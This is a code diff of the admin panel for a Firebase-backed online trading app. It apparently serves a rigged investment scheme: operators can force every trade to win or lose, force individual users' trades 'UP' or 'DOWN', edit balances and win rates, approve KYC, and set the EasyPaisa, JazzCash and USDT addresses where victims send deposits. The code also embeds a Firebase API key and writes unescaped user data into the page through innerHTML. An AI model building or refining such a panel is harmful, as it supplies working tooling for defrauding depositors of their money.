@@ -1,61 +1,102 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8"><title>G-Terminal | Admin Panel</title>
-    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
+    <meta charset="UTF-8">
+    <title>G-Terminal | Ultra Admin</title>
     <style>
-        body { background: #0b0e11; color: white; font-family: sans-serif; padding: 20px; }
-        .card { background: #1e2329; padding: 20px; border-radius: 15px; margin-bottom: 20px; border: 1px solid #333; }
+        body { background: #05070a; color: white; font-family: sans-serif; padding: 20px; }
+        .section { background: #1e2329; padding: 20px; border-radius: 15px; margin-bottom: 20px; border: 1px solid #333; }
+        h2 { color: #f0b90b; border-bottom: 1px solid #333; padding-bottom: 10px; }
         table { width: 100%; border-collapse: collapse; margin-top: 10px; }
-        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #333; }
-        .btn { padding: 8px 12px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
-        .win { background: #0ecb81; color: white; } .loss { background: #f6465d; color: white; }
-        input { background: #2b3139; color: white; border: 1px solid #444; padding: 5px; width: 60px; }
+        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #333; font-size: 13px; }
+        .btn { padding: 8px 12px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; margin-right: 5px; }
+        .btn-green { background: #02c076; color: white; }
+        .btn-red { background: #f6465d; color: white; }
+        .btn-blue { background: #3a7bd5; color: white; }
+        input { padding: 10px; background: #000; border: 1px solid #444; color: white; border-radius: 5px; margin: 5px; }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <h2>🌍 GLOBAL MARKET OVERRIDE</h2>
-        <button class="btn win" onclick="setG('WIN')">FORCE WIN ALL</button>
-        <button class="btn" style="background:#555; color:white;" onclick="setG('NORMAL')">RESET NORMAL</button>
-        <button class="btn loss" onclick="setG('LOSS')">FORCE LOSS ALL</button>
+    <h1>TERMINAL <span style="color:#f0b90b">COMMANDER</span></h1>
+
+    <div class="section">
+        <h2>App Settings (Deposit Methods)</h2>
+        <input type="text" id="set-easypaisa" placeholder="EasyPaisa Number/Name">
+        <input type="text" id="set-jazzcash" placeholder="JazzCash Number/Name">
+        <input type="text" id="set-usdt" placeholder="USDT Wallet Address">
+        <button class="btn btn-blue" onclick="updateSettings()">Update App Details</button>
     </div>
 
-    <div class="card">
-        <h2>MANAGE USERS</h2>
-        <table>
-            <thead><tr><th>User Email</th><th>Balance</th><th>Win Rate %</th><th>Control</th><th>KYC</th></tr></thead>
+    <div class="section">
+        <h2>User Management (KYC, Trade, Balance)</h2>
+        <table id="user-table">
+            <thead>
+                <tr>
+                    <th>Email/UID</th>
+                    <th>Balance</th>
+                    <th>KYC Status</th>
+                    <th>Trade Logic</th>
+                    <th>Actions</th>
+                </tr>
+            </thead>
             <tbody id="user-list"></tbody>
         </table>
     </div>
 
-<script>
-    firebase.initializeApp({ databaseURL: "https://trade-for-profit-8b160-default-rtdb.firebaseio.com" });
-    const db = firebase.database();
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+        import { getDatabase, ref, onValue, update } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
 
-    function setG(v) { db.ref('settings/globalControl').set(v); alert("Global: " + v); }
+        const firebaseConfig = {
+            apiKey: "AIzaSyCM_qmcvOXXjJrQHPiracy5SOpTjAJEnYU",
+            authDomain: "trade-for-profit-8b160.firebaseapp.com",
+            databaseURL: "https://trade-for-profit-8b160-default-rtdb.firebaseio.com",
+            projectId: "trade-for-profit-8b160",
+            appId: "1:1077014018991:web:24f051595ac36857fd4d5a"
+        };
 
-    db.ref('users').on('value', snap => {
-        const list = document.getElementById('user-list');
-        list.innerHTML = "";
-        snap.forEach(child => {
-            const u = child.val();
-            const uid = child.key;
-            list.innerHTML += `
-                <tr>
-                    <td>${u.email}</td>
-                    <td><input type="number" value="${u.balance}" onchange="db.ref('users/${uid}/balance').set(parseFloat(this.value))"></td>
-                    <td><input type="number" value="${u.winRate || 50}" onchange="db.ref('users/${uid}/winRate').set(parseInt(this.value))"> %</td>
-                    <td>
-                        <button class="win" onclick="db.ref('users/${uid}/control').set('WIN')">W</button>
-                        <button class="loss" onclick="db.ref('users/${uid}/control').set('LOSS')">L</button>
-                    </td>
-                    <td><button onclick="db.ref('users/${uid}/kyc_status').set('APPROVED')">Approve</button></td>
-                </tr>`;
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+
+        // Update App Settings (EasyPaisa/USDT)
+        window.updateSettings = () => {
+            const ep = document.getElementById('set-easypaisa').value;
+            const jc = document.getElementById('set-jazzcash').value;
+            const us = document.getElementById('set-usdt').value;
+            update(ref(db, 'settings/'), { easypaisa: ep, jazzcash: jc, usdt_address: us })
+            .then(() => alert("Settings Updated!"));
+        };
+
+        // Load Users
+        onValue(ref(db, 'users'), (snapshot) => {
+            const users = snapshot.val();
+            const list = document.getElementById('user-list');
+            list.innerHTML = "";
+            
+            for (let id in users) {
+                const user = users[id];
+                list.innerHTML += `
+                    <tr>
+                        <td>${user.email || id}</td>
+                        <td>$${user.balance}</td>
+                        <td><b>${user.kyc_status || 'NONE'}</b></td>
+                        <td>Force: <span style="color:#f0b90b">${user.trade_force || 'Normal'}</span></td>
+                        <td>
+                            <button class="btn btn-green" onclick="controlUser('${id}', 'kyc_status', 'APPROVED')">Approve KYC</button>
+                            <button class="btn btn-red" onclick="controlUser('${id}', 'kyc_status', 'REJECTED')">Reject KYC</button>
+                            <br><br>
+                            <button class="btn btn-blue" onclick="controlUser('${id}', 'trade_force', 'UP')">Force UP</button>
+                            <button class="btn btn-red" onclick="controlUser('${id}', 'trade_force', 'DOWN')">Force DOWN</button>
+                        </td>
+                    </tr>
+                `;
+            }
         });
-    });
-</script>
+
+        window.controlUser = (uid, key, value) => {
+            update(ref(db, `users/${uid}`), { [key]: value });
+        };
+    </script>
 </body>
 </html>
